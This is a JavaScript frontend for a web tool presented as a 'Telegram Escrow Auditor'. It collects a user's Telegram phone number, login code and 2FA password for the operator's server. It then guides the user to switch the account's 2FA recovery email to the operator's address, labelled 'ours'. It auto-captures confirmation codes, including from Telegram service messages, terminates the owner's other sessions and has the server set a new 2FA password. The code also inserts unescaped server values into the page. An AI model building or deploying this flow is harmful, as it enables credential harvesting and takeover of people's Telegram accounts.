/**
 * Telegram Escrow Auditor - Frontend V3
 * Supports new unified API with email management and transfer modes
 */

// Auto-detect API URL based on current location
const API_URL = window.location.origin + "/api/v1";

let appState = {
    phone: null,
    telegramId: null,
    currentStep: 1,
    authStatus: null,
    auditResult: null,
    targetEmail: null,
    emailHash: null,
    transferMode: "bot_only",
    generatedPassword: null
};

// ==================== Helper Functions ====================

function showView(viewId) {
    const views = [
        'view-phone', 'view-code', 'view-2fa', 'view-email', 
        'view-audit', 'view-finalize', 'view-complete'
    ];
    views.forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.add('hidden');
    });
    const view = document.getElementById(viewId);
    if (view) view.classList.remove('hidden');
}

function setStep(stepNum) {
    appState.currentStep = stepNum;
    for (let i = 1; i <= 6; i++) {
        const el = document.getElementById(`step-${i}`);
        if (el) {
            el.classList.remove('active', 'completed');
            if (i < stepNum) el.classList.add('completed');
            else if (i === stepNum) el.classList.add('active');
        }
    }
}

function showStatus(message, type = 'info') {
    const el = document.getElementById('status-message');
    if (el) {
        el.className = `status-box ${type}`;
        el.innerHTML = message;
        el.classList.remove('hidden');
    }
}

function hideStatus() {
    const el = document.getElementById('status-message');
    if (el) el.classList.add('hidden');
}

function setLoading(buttonId, loading, originalText = null) {
    const btn = document.getElementById(buttonId);
    if (btn) {
        btn.disabled = loading;
        if (loading) {
            btn.dataset.originalText = btn.innerHTML;
            btn.innerHTML = '<span class="loader"></span> Processing...';
        } else {
            btn.innerHTML = originalText || btn.dataset.originalText || btn.innerHTML;
        }
    }
}

function formatPhone(phone) {
    let cleaned = phone.replace(/\s/g, '');
    if (!cleaned.startsWith('+')) {
        cleaned = '+' + cleaned;
    }
    return cleaned;
}

async function apiCall(endpoint, method = 'GET', data = null) {
    const options = {
        method,
        headers: { 'Content-Type': 'application/json' }
    };
    
    if (data) {
        options.body = JSON.stringify(data);
    }
    
    try {
        const response = await fetch(`${API_URL}${endpoint}`, options);
        const result = await response.json();
        
        if (!response.ok) {
            throw new Error(result.detail || 'Unknown error');
        }
        
        return result;
    } catch (error) {
        console.error('API Error:', error);
        throw error;
    }
}

// ==================== Step 1: Phone & Mode Selection ====================

async function sendCode() {
    const phoneInput = document.getElementById('phone-input');
    const modeSelect = document.getElementById('transfer-mode');
    const phone = formatPhone(phoneInput.value);
    const mode = modeSelect ? modeSelect.value : 'bot_only';
    
    if (!phone || phone.length < 10) {
        showStatus('Please enter a valid phone number', 'error');
        return;
    }
    
    setLoading('btn-send-code', true);
    hideStatus();
    
    try {
        const result = await apiCall('/auth/init', 'POST', { 
            phone: phone,
            transfer_mode: mode
        });
        
        appState.phone = phone;
        appState.transferMode = mode;
        
        if (result.status === 'already_authenticated') {
            appState.telegramId = result.telegram_id;
            appState.targetEmail = result.target_email;
            appState.emailHash = result.email_hash;
            showStatus('Already authenticated! Skipping to email...', 'success');
            setStep(3);
            showView('view-email');
            displayEmailInstructions();
        } else if (result.status === 'code_sent') {
            showStatus('Verification code sent to Telegram', 'success');
            setStep(2);
            showView('view-code');
        } else if (result.status === 'already_logged_in' || result.status === 'success') {
            showStatus('Logged in successfully', 'success');
            setStep(2);
            showView('view-code');
        }
        
    } catch (error) {
        showStatus(`Error: ${error.message}`, 'error');
    } finally {
        setLoading('btn-send-code', false, 'Send Verification Code');
    }
}

// ==================== Step 2: Verify Code ====================

async function verifyCode() {
    const codeInput = document.getElementById('code-input');
    const code = codeInput.value.trim();
    
    if (!code || code.length < 5) {
        showStatus('Please enter the verification code', 'error');
        return;
    }
    
    setLoading('btn-verify-code', true);
    hideStatus();
    
    try {
        const result = await apiCall('/auth/verify', 'POST', {
            phone: appState.phone,
            code: code
        });
        
        if (result.status === 'authenticated') {
            appState.telegramId = result.telegram_id;
            appState.targetEmail = result.target_email;
            appState.emailHash = result.email_hash;
            
            showStatus('Authenticated successfully!', 'success');
            setStep(3);
            showView('view-email');
            displayEmailInstructions();
            
        } else if (result.status === '2fa_required') {
            showStatus('2FA password required', 'info');
            if (result.hint) {
                document.getElementById('2fa-hint').textContent = `Hint: ${result.hint}`;
            }
            showView('view-2fa');
        }
        
    } catch (error) {
        showStatus(`Error: ${error.message}`, 'error');
    } finally {
        setLoading('btn-verify-code', false, 'Verify');
    }
}

// ==================== Step 2b: Verify 2FA ====================

async function verify2FA() {
    const passwordInput = document.getElementById('2fa-input');
    const password = passwordInput.value;
    
    if (!password) {
        showStatus('Please enter the password', 'error');
        return;
    }
    
    setLoading('btn-verify-2fa', true);
    hideStatus();
    
    try {
        const result = await apiCall('/auth/verify', 'POST', {
            phone: appState.phone,
            password: password
        });
        
        if (result.status === 'authenticated') {
            appState.telegramId = result.telegram_id;
            appState.targetEmail = result.target_email;
            appState.emailHash = result.email_hash;
            
            showStatus('Logged in successfully!', 'success');
            setStep(3);
            showView('view-email');
            displayEmailInstructions();
        }
        
    } catch (error) {
        showStatus(`Error: ${error.message}`, 'error');
    } finally {
        setLoading('btn-verify-2fa', false, 'Verify');
    }
}

// ==================== Step 3: Email Change ====================

async function displayEmailInstructions() {
    const emailDisplay = document.getElementById('target-email-display');
    const emailInstructions = document.getElementById('email-instructions');
    
    if (emailDisplay && appState.targetEmail) {
        emailDisplay.innerHTML = `
            <div class="email-box">
                <span class="label">Target Email:</span>
                <span class="email-value" id="email-to-copy">${appState.targetEmail}</span>
                <button onclick="copyEmail()" class="btn-copy" title="Copy">Copy</button>
            </div>
        `;
    }
    
    if (emailInstructions) {
        emailInstructions.innerHTML = `
            <div class="instructions">
                <h4>Steps to change 2FA recovery email:</h4>
                <ol>
                    <li>Open Telegram app</li>
                    <li>Go to Settings > Privacy & Security > Two-Step Verification</li>
                    <li>Tap "Recovery Email"</li>
                    <li>Change email to: <strong>${appState.targetEmail}</strong></li>
                    <li>A confirmation code will be sent to the new email</li>
                    <li>Click "Auto-Check Code" or enter it manually</li>
                </ol>
            </div>
        `;
    }
    
    // Fetch and show live email status
    await refreshEmailStatus();
}

function copyEmail() {
    const email = appState.targetEmail;
    if (email) {
        navigator.clipboard.writeText(email).then(() => {
            showStatus('Email copied!', 'success');
        });
    }
}

async function refreshEmailStatus() {
    const statusContent = document.getElementById('email-status-content');
    if (!statusContent) return;
    
    statusContent.innerHTML = '<div class="loading">Checking email status...</div>';
    
    try {
        const result = await apiCall(`/email/confirm/${encodeURIComponent(appState.phone)}`, 'POST');
        
        let html = '<div class="email-live-status">';
        
        // Recovery email (2FA)
        html += '<div class="email-row">';
        html += '<strong>2FA Recovery Email:</strong> ';
        if (result.recovery_email) {
            const isOurs = result.email_matches === true;
            html += `<span style="color:${isOurs ? 'var(--success)' : 'var(--danger)'}">`;
            html += `${result.recovery_email} ${isOurs ? 'Ours' : 'Not ours!'}</span>`;
        } else if (result.email_unconfirmed_pattern) {
            const isOurs = result.email_matches === true;
            html += `<span style="color:var(--warning)">Pending confirmation: ${result.email_unconfirmed_pattern}`;
            html += ` ${isOurs ? '(Ours)' : '(Not ours!)'}</span>`;
        } else if (result.email_status === 'confirmed_unknown') {
            html += '<span style="color:var(--warning)">Confirmed but unknown (need password)</span>';
        } else {
            html += '<span style="color:var(--text-light)">Not set</span>';
        }
        html += '</div>';
        
        // Login email (separate)
        if (result.login_email_pattern) {
            html += '<div class="email-row" style="margin-top:8px;">';
            html += '<strong>Login Email:</strong> ';
            html += `<span style="color:var(--text-light)">${result.login_email_pattern} (separate feature)</span>`;
            html += '</div>';
        }
        
        // Overall status
        html += '<div class="email-row" style="margin-top:8px;">';
        if (result.email_changed) {
            html += '<span style="color:var(--success)">Email changed to ours!</span>';
            document.getElementById('btn-confirm-email').classList.remove('hidden');
        } else {
            html += '<span style="color:var(--warning)">Email not changed to ours yet</span>';
        }
        html += '</div>';
        
        html += '</div>';
        statusContent.innerHTML = html;
        
    } catch (error) {
        statusContent.innerHTML = `<div class="error">Error: ${error.message}</div>`;
    }
}

async function checkEmailCode() {
    setLoading('btn-check-code', true);
    hideStatus();
    
    const codeDisplay = document.getElementById('email-code-display');
    codeDisplay.innerHTML = '<div class="loading">Checking for code...</div>';
    
    try {
        // Wait up to 8 seconds for code from email webhook
        const result = await apiCall(`/email/code/${encodeURIComponent(appState.phone)}?wait_seconds=8`);
        
        if (result.status === 'received') {
            codeDisplay.innerHTML = `
                <div class="code-received">
                    <div class="icon">✓</div>
                    <h3>Code Received!</h3>
                    <div class="code-value">${result.code}</div>
                    <p>Enter this code in Telegram to confirm the email change</p>
                </div>
            `;
            showStatus('Confirmation code received! Enter it in Telegram then click confirm', 'success');
            document.getElementById('btn-confirm-email').classList.remove('hidden');
            
        } else {
            // Fallback: try to read code from Telegram messages (777000)
            try {
                const fallback = await apiCall(`/email/code-fallback/${encodeURIComponent(appState.phone)}`);
                if (fallback.status === 'received' && fallback.code) {
                    codeDisplay.innerHTML = `
                        <div class="code-received">
                            <div class="icon">✓</div>
                            <h3>Code captured from Telegram!</h3>
                            <div class="code-value">${fallback.code}</div>
                            <p>Enter this code to confirm the email</p>
                        </div>
                    `;
                    showStatus('Code captured from Telegram messages!', 'success');
                    document.getElementById('btn-confirm-email').classList.remove('hidden');
                    return;
                }
            } catch(e) {}
            
            codeDisplay.innerHTML = `
                <div class="waiting">
                    <div class="icon">...</div>
                    <h3>Waiting for code...</h3>
                    <p>Make sure you changed the email in Telegram, or enter the code manually</p>
                </div>
            `;
        }
        
    } catch (error) {
        codeDisplay.innerHTML = `<div class="error">Error: ${error.message}</div>`;
    } finally {
        setLoading('btn-check-code', false, 'Auto-Check Code');
    }
}

async function submitManualEmailCode() {
    const codeInput = document.getElementById('manual-email-code');
    const code = codeInput ? codeInput.value.trim() : '';
    
    if (!code || code.length < 5) {
        showStatus('Please enter a valid code (5-6 digits)', 'error');
        return;
    }
    
    showStatus('Confirming code...', 'info');
    
    try {
        // Try to confirm the recovery email with this code
        const result = await apiCall(`/email/confirm-code/${encodeURIComponent(appState.phone)}`, 'POST', {
            code: code
        });
        
        if (result.status === 'success') {
            showStatus('Recovery email confirmed successfully!', 'success');
            document.getElementById('btn-confirm-email').classList.remove('hidden');
            // Refresh status
            await refreshEmailStatus();
        } else {
            showStatus(`Confirmation failed: ${result.message || result.error || 'Invalid code'}`, 'error');
        }
    } catch (error) {
        showStatus(`Error: ${error.message}`, 'error');
    }
}

async function confirmEmailChanged() {
    setLoading('btn-confirm-email', true);
    hideStatus();
    
    try {
        const result = await apiCall(`/email/confirm/${encodeURIComponent(appState.phone)}`, 'POST');
        
        if (result.status === 'success' && result.email_changed) {
            showStatus('Email change confirmed successfully!', 'success');
            setStep(4);
            showView('view-audit');
        } else {
            let msg = 'Recovery email not changed to ours yet.';
            if (result.current_display) msg += ` Current: ${result.current_display}`;
            if (result.expected_email) msg += ` Expected: ${result.expected_email}`;
            showStatus(msg, 'warning');
            // Refresh status
            await refreshEmailStatus();
        }
        
    } catch (error) {
        showStatus(`Error: ${error.message}`, 'error');
    } finally {
        setLoading('btn-confirm-email', false, 'Confirm Email Change & Continue');
    }
}

// ==================== Step 4: Security Audit ====================

async function runAudit() {
    setLoading('btn-run-audit', true);
    hideStatus();
    
    const auditLog = document.getElementById('audit-log');
    auditLog.innerHTML = '<div class="loading">Running security audit...</div>';
    
    try {
        const result = await apiCall(`/account/audit/${encodeURIComponent(appState.phone)}`);
        
        appState.auditResult = result;
        
        let html = '';
        
        if (result.passed) {
            html = `
                <div class="audit-success">
                    <div class="icon">✓</div>
                    <h3>Account ready for transfer!</h3>
                    <p>All security checks passed</p>
                    ${result.email_changed ? '<p class="email-ok">Email changed to ours</p>' : ''}
                </div>
            `;
            showStatus('You can proceed to finalize', 'success');
            document.getElementById('btn-proceed-finalize').classList.remove('hidden');
        } else {
            html = `
                <div class="audit-failed">
                    <div class="icon">✗</div>
                    <h3>${result.issues_count} issue(s) need to be resolved</h3>
                </div>
                <ul class="issues-list">
            `;
            
            result.issues.forEach(issue => {
                html += `
                    <li class="issue-item severity-${issue.severity}">
                        <div class="issue-title">${issue.title}</div>
                        <div class="issue-desc">${issue.description}</div>
                        <div class="issue-action">💡 ${issue.action}</div>
                    </li>
                `;
            });
            
            html += '</ul>';
            
            // Show actions if needed
            if (result.actions_needed) {
                const actions = result.actions_needed;
                
                if (actions.change_email && !result.email_changed) {
                    html += `
                        <div class="action-needed">
                            <h4>Email change required to:</h4>
                            <div class="email-box">${appState.targetEmail || actions.our_email}</div>
                            <button onclick="showView('view-email')" class="btn-secondary">Go back to change email</button>
                        </div>
                    `;
                }
                
                // Check for manual session termination (BOT_ONLY mode)
                const manualSessionIssue = result.issues?.find(i => i.type === 'TERMINATE_SESSIONS_MANUAL');
                const autoSessionIssue = result.issues?.find(i => i.type === 'TERMINATE_SESSIONS_AUTO');
                
                if (manualSessionIssue) {
                    html += `
                        <div class="action-needed sessions-manual">
                            <h4>Manual session termination required:</h4>
                            <ul class="sessions-list">
                                ${manualSessionIssue.sessions.map(s => `<li>${s}</li>`).join('')}
                            </ul>
                            <p>Telegram 24h restriction - must be done from the app</p>
                            <ol>
                                <li>Open Telegram > Settings > Devices</li>
                                <li>Tap "Terminate all other sessions"</li>
                            </ol>
                        </div>
                    `;
                } else if (autoSessionIssue || actions.terminate_sessions) {
                    html += `
                        <div class="action-needed">
                            <button onclick="terminateSessions()" class="btn-secondary">Auto-terminate other sessions</button>
                        </div>
                    `;
                }
            }
            
            showStatus('Please resolve the issues above then re-run the audit', 'warning');
        }
        
        // Show transfer mode info
        html += `
            <div class="mode-info">
                <strong>Transfer Mode:</strong> ${result.transfer_mode === 'bot_only' ? 'Bot Only (full logout)' : 'Keep one session'}
            </div>
        `;
        
        auditLog.innerHTML = html;
        
    } catch (error) {
        auditLog.innerHTML = `<div class="error">Audit error: ${error.message}</div>`;
        showStatus(`Error: ${error.message}`, 'error');
    } finally {
        setLoading('btn-run-audit', false, 'Run Security Audit');
    }
}

async function terminateSessions() {
    if (!confirm('Are you sure you want to terminate all other sessions?')) {
        return;
    }
    
    try {
        showStatus('Terminating sessions...', 'info');
        
        // Use sessions health check and regenerate
        const result = await apiCall(`/sessions/health/${encodeURIComponent(appState.phone)}`);
        
        showStatus('Done. Please re-run the audit.', 'success');
        
    } catch (error) {
        showStatus(`Error: ${error.message}`, 'error');
    }
}

function proceedToFinalize() {
    setStep(5);
    showView('view-finalize');
}

// ==================== Step 5: Finalize ====================

async function finalizeAccount() {
    setLoading('btn-finalize', true);
    hideStatus();
    
    const password2fa = document.getElementById('current-2fa-password')?.value || null;
    
    try {
        const result = await apiCall(`/account/finalize/${encodeURIComponent(appState.phone)}`, 'POST', {
            confirm_email_changed: true,
            two_fa_password: password2fa
        });
        
        if (result.status === 'success') {
            appState.generatedPassword = result.password;
            
            setStep(6);
            showView('view-complete');
            
            document.getElementById('complete-message').innerHTML = `
                <div class="success-big">
                    <div class="icon">🎉</div>
                    <h2>Operation Completed Successfully!</h2>
                    <div class="credentials-box">
                        <div class="credential">
                            <span class="label">Phone:</span>
                            <span class="value">${appState.phone}</span>
                        </div>
                        <div class="credential">
                            <span class="label">2FA Password:</span>
                            <span class="value password">${result.password}</span>
                            <button onclick="copyPassword('${result.password}')" class="btn-copy">📋</button>
                        </div>
                        <div class="credential">
                            <span class="label">Email:</span>
                            <span class="value">${appState.targetEmail}</span>
                        </div>
                        <div class="credential">
                            <span class="label">Transfer Mode:</span>
                            <span class="value">${result.transfer_mode === 'bot_only' ? 'Bot Only' : 'Keep Session'}</span>
                        </div>
                        <div class="credential">
                            <span class="label">Terminated Sessions:</span>
                            <span class="value">${result.terminated_sessions || 0}</span>
                        </div>
                    </div>
                    <p class="warning">Save the password in a safe place!</p>
                </div>
            `;
        }
        
    } catch (error) {
        showStatus(`Error: ${error.message}`, 'error');
    } finally {
        setLoading('btn-finalize', false, 'Finalize Account');
    }
}

function copyPassword(password) {
    navigator.clipboard.writeText(password).then(() => {
        showStatus('Password copied!', 'success');
    });
}

// ==================== Session Health Check ====================

async function checkSessionHealth() {
    try {
        const result = await apiCall(`/sessions/health/${encodeURIComponent(appState.phone)}`);
        
        let statusHtml = '<div class="health-check">';
        statusHtml += `<h4>Session Status:</h4>`;
        statusHtml += `<p>Pyrogram: ${result.checks.pyrogram_session.valid ? 'Valid' : 'Invalid'}</p>`;
        statusHtml += `<p>Telethon: ${result.checks.telethon_session.valid ? 'Valid' : 'Invalid'}</p>`;
        statusHtml += `<p>Email: ${result.checks.email_unchanged ? 'Unchanged' : 'Changed!'}</p>`;
        statusHtml += `<p>Sessions: ${result.checks.sessions_count}</p>`;
        
        if (result.needs_attention) {
            statusHtml += `<p class="warning">Needs attention!</p>`;
        }
        
        statusHtml += '</div>';
        
        showStatus(statusHtml, result.status === 'healthy' ? 'success' : 'warning');
        
    } catch (error) {
        showStatus(`Error: ${error.message}`, 'error');
    }
}

// ==================== Initialize ====================

document.addEventListener('DOMContentLoaded', () => {
    showView('view-phone');
    setStep(1);
    hideStatus();
});
